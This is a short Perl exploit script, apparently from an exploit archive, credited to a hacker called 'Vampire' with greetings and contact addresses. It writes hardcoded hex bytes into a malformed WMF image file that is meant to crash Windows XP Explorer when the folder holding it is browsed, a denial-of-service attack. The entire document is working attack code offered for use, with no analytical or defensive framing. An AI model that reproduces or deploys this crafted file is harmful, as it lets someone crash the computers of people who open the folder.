#!/usr/bin/perl
# WMF 0-day Dos Exploit
# Exploit Coded by Vampire (Form Iran)
# Contact : Vampire_Chiristof@yahoo.com
# Bug Found by Orbital 
# Gr33tz To : Spy , l0pht.blackhat ,  Samir , Scorpino  y4nliz and All Iranian Hackers and Programmers !!!
# Contact : orbital_q3nius@yahoo.com
# Coded In Perl , PHP  , Python
# the C version written but Still priv8
print "\nWMF Denial of Service Exploit by Vampire in PHP , PERL , PYTHON , C";
print "\n\nGenerating vampire.wmf...";
open(WMF, ">./vampire.wmf") or die "Cannot Create WMF File !\n";
print WMF "\x01\x00\x09\x00\x00\x03\x22\x00\x00\x00\x63\x79\x61\x6E\x69\x64";
print WMF "\x2D\x45\x07\x00\x00\x00\xFC\x02\x00\x00\x00\x00\x00\x00\x00\x00";
print WMF "\x08\x00\x00\x00\xFA\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
print WMF "\x07\x00\x00\x00\xFC\x02\x08\x00\x00\x00\x00\x00\x00\x80\x03\x00";
print WMF "\x00\x00\x00\x00";
close(WMF);
print "ok\n\nNow Try To Browse Folder In XP Explorer And Wait !!!\n"; 
